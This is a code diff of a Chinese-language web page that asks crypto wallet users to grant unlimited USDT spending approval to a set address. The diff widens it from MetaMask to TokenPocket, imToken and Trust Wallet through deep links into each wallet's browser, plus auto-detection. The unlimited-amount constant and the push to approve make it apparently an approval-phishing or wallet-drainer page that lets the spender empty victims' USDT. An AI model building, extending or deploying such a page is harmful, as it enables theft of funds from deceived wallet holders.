@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>MetaMask USDT 无限授权</title>
+    <title>多钱包 USDT 无限授权</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -58,6 +58,12 @@
             background: #f0f0ff;
             color: #667eea;
         }
+        .wallet-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
         .wallet-item {
             display: flex;
             align-items: center;
@@ -67,7 +73,6 @@
             cursor: pointer;
             transition: all 0.2s;
             background: white;
-            margin-bottom: 16px;
         }
         .wallet-item.selected {
             border-color: #667eea;
@@ -84,9 +89,17 @@
             margin-right: 16px;
             font-size: 24px;
         }
+        .wallet-info {
+            flex: 1;
+        }
         .wallet-name {
             font-weight: 600;
             color: #333;
+            margin-bottom: 4px;
+        }
+        .wallet-chains {
+            font-size: 12px;
+            color: #999;
         }
         .info-box {
             background: #f5f5f5;
@@ -141,23 +154,45 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .dialog-mask {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .dialog {
+            background: white;
+            border-radius: 18px;
+            padding: 20px;
+            max-width: 80%;
+            text-align: center;
+        }
+        .dialog-button {
+            margin-top: 16px;
+            padding: 8px 24px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="card">
         <h1>🔐 USDT 授权</h1>
-        <div class="subtitle">MetaMask 无限额度授权</div>
+        <div class="subtitle">多钱包无限额度授权</div>
 
         <div class="chain-selector" id="chainSelector">
             <button class="chain-btn active" data-chain="1">Ethereum</button>
             <button class="chain-btn" data-chain="56">BNB Chain</button>
         </div>
 
-        <div class="wallet-item" data-wallet="metamask">
-            <div class="wallet-icon">🦊</div>
-            <div class="wallet-name">MetaMask</div>
-        </div>
+        <div class="wallet-list" id="walletList"></div>
 
         <div class="info-box">
             <div class="info-label">授权地址</div>
@@ -168,6 +203,13 @@
 
         <button class="approve-btn" id="approveBtn">授权 USDT</button>
         <div class="status hidden" id="status"></div>
+    </div>
+</div>
+
+<div id="dialogMask" class="dialog-mask">
+    <div class="dialog">
+        <div class="dialog-message"></div>
+        <button class="dialog-button">确定</button>
     </div>
 </div>
 
@@ -184,7 +226,7 @@
     };
     const UNLIMITED_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-    // 网络配置（用于添加网络）
+    // 网络配置
     const NETWORKS = {
         1: {
             chainId: '0x1',
@@ -202,26 +244,69 @@
         }
     };
 
+    // 钱包配置
+    const WALLETS = [
+        { key: 'metamask', name: 'MetaMask', icon: '🦊', chains: ['evm'], dappUrl: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`, isInjected: () => window.ethereum && window.ethereum.isMetaMask === true },
+        { key: 'tokenpocket', name: 'TokenPocket', icon: '🎫', chains: ['evm'], dappUrl: (url) => `https://tokenpocket.pro/app/dapp/${url.replace(/^https?:\/\//, '')}`, isInjected: () => window.ethereum && window.ethereum.isTokenPocket === true },
+        { key: 'imtoken', name: 'imToken', icon: '🔷', chains: ['evm'], dappUrl: (url) => `https://token.im/dapp?url=${encodeURIComponent(url)}`, isInjected: () => window.ethereum && window.ethereum.isImToken === true },
+        { key: 'trust', name: 'Trust Wallet', icon: '🔒', chains: ['evm'], dappUrl: (url) => `https://link.trustwallet.com/dapp/${url.replace(/^https?:\/\//, '')}`, isInjected: () => window.ethereum && window.ethereum.isTrust === true }
+    ];
+
     let currentChain = '1';
     let selectedWallet = null;
+    let provider = null;
+
+    // DOM 元素
+    const walletListEl = document.getElementById('walletList');
+    const statusDiv = document.getElementById('status');
+    const dialogMask = document.getElementById('dialogMask');
+    const dialogMessage = document.getElementById('dialogMessage');
+    const dialogButton = document.querySelector('.dialog-button');
 
     function showStatus(message, type = 'loading') {
-        const statusEl = document.getElementById('status');
-        statusEl.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
-        statusEl.className = `status ${type}`;
-        statusEl.classList.remove('hidden');
+        statusDiv.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
+        statusDiv.className = `status ${type}`;
+        statusDiv.classList.remove('hidden');
+    }
+    function hideStatus() { statusDiv.classList.add('hidden'); }
+    function showDialog(msg) {
+        dialogMessage.textContent = msg;
+        dialogMask.style.display = 'flex';
+    }
+    function hideDialog() { dialogMask.style.display = 'none'; }
+    dialogButton.onclick = hideDialog;
+    dialogMask.onclick = (e) => { if (e.target === dialogMask) hideDialog(); };
+
+    // 渲染钱包列表
+    function renderWalletList() {
+        walletListEl.innerHTML = WALLETS.map(w => `
+            <div class="wallet-item" data-wallet="${w.key}">
+                <div class="wallet-icon">${w.icon}</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">${w.name}</div>
+                    <div class="wallet-chains">EVM</div>
+                </div>
+            </div>
+        `).join('');
+        document.querySelectorAll('.wallet-item').forEach(item => {
+            item.addEventListener('click', () => {
+                const key = item.dataset.wallet;
+                selectedWallet = key;
+                document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
+                item.classList.add('selected');
+                hideStatus();
+            });
+        });
     }
 
-    function hideStatus() {
-        document.getElementById('status').classList.add('hidden');
+    // 检测是否在指定钱包的内置浏览器中
+    function isInWalletBrowser(walletKey) {
+        const wallet = WALLETS.find(w => w.key === walletKey);
+        if (!wallet) return false;
+        return wallet.isInjected();
     }
 
-    // 检测是否在 MetaMask 内置浏览器中（有 window.ethereum 且 isMetaMask 为 true）
-    function isInMetaMaskBrowser() {
-        return typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask === true;
-    }
-
-    // 切换网络（如果未添加则先添加）
+    // 切换网络
     async function switchNetwork(targetChainId) {
         const targetHex = '0x' + parseInt(targetChainId).toString(16);
         try {
@@ -231,7 +316,6 @@
             });
             return true;
         } catch (error) {
-            // 如果网络未添加，则尝试添加
             if (error.code === 4902) {
                 try {
                     await window.ethereum.request({
@@ -252,15 +336,15 @@
         }
     }
 
-    // 在 MetaMask 内置浏览器中直接授权
-    async function approveInMetaMask() {
+    // 在钱包内置浏览器中授权
+    async function approveInWallet() {
         if (!window.ethereum) {
-            showStatus('未检测到 MetaMask 钱包', 'error');
+            showStatus('未检测到钱包', 'error');
             return false;
         }
         try {
             const targetChainId = parseInt(currentChain);
-            // 获取当前网络
+            // 检查网络
             const currentChainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
             const currentChainId = parseInt(currentChainIdHex, 16);
             if (currentChainId !== targetChainId) {
@@ -270,7 +354,6 @@
                     showStatus('网络切换失败，请手动切换到目标网络', 'error');
                     return false;
                 }
-                // 等待网络切换生效（可选）
                 await new Promise(resolve => setTimeout(resolve, 500));
             }
 
@@ -310,59 +393,76 @@
         }
     }
 
-    // 跳转到 MetaMask 内置浏览器
-    function jumpToMetaMask() {
-        const currentUrl = window.location.href;
-        // 使用 MetaMask 通用链接 (https://metamask.app.link/dapp/...) 在移动端更稳定
-        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-        let metamaskUrl;
-        if (isMobile) {
-            metamaskUrl = `https://metamask.app.link/dapp/${currentUrl.replace(/^https?:\/\//, '')}`;
-        } else {
-            metamaskUrl = `metamask://dapp/?url=${encodeURIComponent(currentUrl)}`;
+    // 跳转到钱包内置浏览器
+    function jumpToWallet() {
+        if (!selectedWallet) {
+            showDialog('请先选择钱包');
+            return;
         }
-        window.location.href = metamaskUrl;
+        const wallet = WALLETS.find(w => w.key === selectedWallet);
+        const currentUrl = window.location.href;
+        const dappUrl = wallet.dappUrl(currentUrl);
+        // 移动端使用通用链接，PC 使用 scheme 备用
+        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        let finalUrl = dappUrl;
+        if (!isMobile && !dappUrl.startsWith('http')) {
+            // PC 端如果链接不是 http，则可能是 scheme，直接使用
+            finalUrl = dappUrl;
+        }
+        window.location.href = finalUrl;
     }
 
     // 主授权入口
     async function onApprove() {
-        // 如果已经在 MetaMask 内置浏览器中，直接授权
-        if (isInMetaMaskBrowser()) {
-            await approveInMetaMask();
+        if (!selectedWallet) {
+            showDialog('请先选择钱包');
             return;
         }
 
-        // 否则，跳转到 MetaMask
-        showStatus('正在跳转到 MetaMask...', 'loading');
-        jumpToMetaMask();
-        // 跳转后，页面会离开，无需进一步处理
+        // 如果已经在当前钱包内置浏览器中，直接授权
+        if (isInWalletBrowser(selectedWallet)) {
+            await approveInWallet();
+            return;
+        }
+
+        // 否则跳转到钱包
+        showStatus('正在跳转到钱包...', 'loading');
+        jumpToWallet();
     }
 
-    // 链选择器
-    document.querySelectorAll('.chain-btn').forEach(btn => {
-        btn.addEventListener('click', () => {
-            document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            currentChain = btn.dataset.chain;
-            hideStatus();
+    // 链切换
+    function onChainChange(chainId) {
+        currentChain = chainId;
+        hideStatus();
+    }
+
+    // 初始化
+    function init() {
+        // 链选择器
+        document.querySelectorAll('.chain-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                onChainChange(btn.dataset.chain);
+            });
         });
-    });
+        document.getElementById('approveBtn').addEventListener('click', onApprove);
+        renderWalletList();
 
-    // 绑定钱包选择（由于只有 MetaMask，直接选中）
-    document.querySelector('.wallet-item').classList.add('selected');
-    selectedWallet = 'metamask';
-
-    // 绑定授权按钮
-    document.getElementById('approveBtn').addEventListener('click', onApprove);
-
-    // 页面加载时，如果已经在 MetaMask 中，直接显示提示
-    if (isInMetaMaskBrowser()) {
-        showStatus('检测到 MetaMask，请点击授权按钮', 'success');
-        setTimeout(() => hideStatus(), 2000);
-    } else {
-        showStatus('请点击授权按钮，将跳转到 MetaMask', 'success');
-        setTimeout(() => hideStatus(), 2000);
+        // 预检查是否在钱包内置浏览器中
+        const detectedWallet = WALLETS.find(w => w.isInjected());
+        if (detectedWallet) {
+            selectedWallet = detectedWallet.key;
+            document.querySelector(`.wallet-item[data-wallet="${detectedWallet.key}"]`).classList.add('selected');
+            showStatus(`检测到 ${detectedWallet.name}，可直接授权`, 'success');
+            setTimeout(() => hideStatus(), 2000);
+        } else {
+            showStatus('请选择钱包并授权', 'success');
+            setTimeout(() => hideStatus(), 2000);
+        }
     }
+
+    init();
 </script>
 </body>
 </html>
